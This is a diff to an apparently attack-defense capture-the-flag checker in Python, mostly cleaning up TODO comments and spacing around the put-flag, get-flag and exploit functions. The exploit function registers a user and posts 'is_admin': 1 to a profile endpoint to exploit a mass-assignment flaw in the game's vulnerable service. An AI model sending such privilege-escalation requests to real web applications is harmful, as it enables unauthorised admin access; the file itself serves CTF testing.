@@ -89,9 +89,6 @@ def assert_status_code(
 Checker functions
 """
 
-
-# TODO: putflag, getflag, putnoise, getnoise, exploit
-# TODO: implement the putflag function next
 @checker.putflag(0)
 async def putflag_db(
     task: PutflagCheckerTaskMessage,
@@ -119,7 +116,7 @@ async def putflag_db(
 
     await db.set("info", (username, password, user_id))
 
-    return f"User {username} Id {user_id} Profile updated" # This is attack info
+    return f"User {username} Id {user_id} Profile updated"  # This is attack info
 
 
 @checker.getflag(0)
@@ -145,7 +142,6 @@ async def getflag_db(
     assert_in(task.flag, flag, "Flag missing")
 
 
-# TODO: fix the flagRegex problem
 @checker.exploit(0)
 async def exploit_mass_assign(
     task: ExploitCheckerTaskMessage,
@@ -162,12 +158,12 @@ async def exploit_mass_assign(
 
     # register user and login
     username, password = noise(10, 15), noise(16, 20)
-    data = {"username": "exploiter_"+username, "password": password}
+    data = {"username": "exploiter_" + username, "password": password}
     r = await client.post("/index.php?action=register", data=data)
     assert_status_code(logger, r, 302, "Register failed", info=data)
 
     # exploit mass assignment in update profile
-    data = {"username": "exploiter_"+username, "is_admin": 1}
+    data = {"username": "exploiter_" + username, "is_admin": 1}
     r = await client.post("/index.php?action=profile", data=data)
     assert_status_code(
         logger, r, 200, "Mass assignment vuln in update Profile failed", info=data
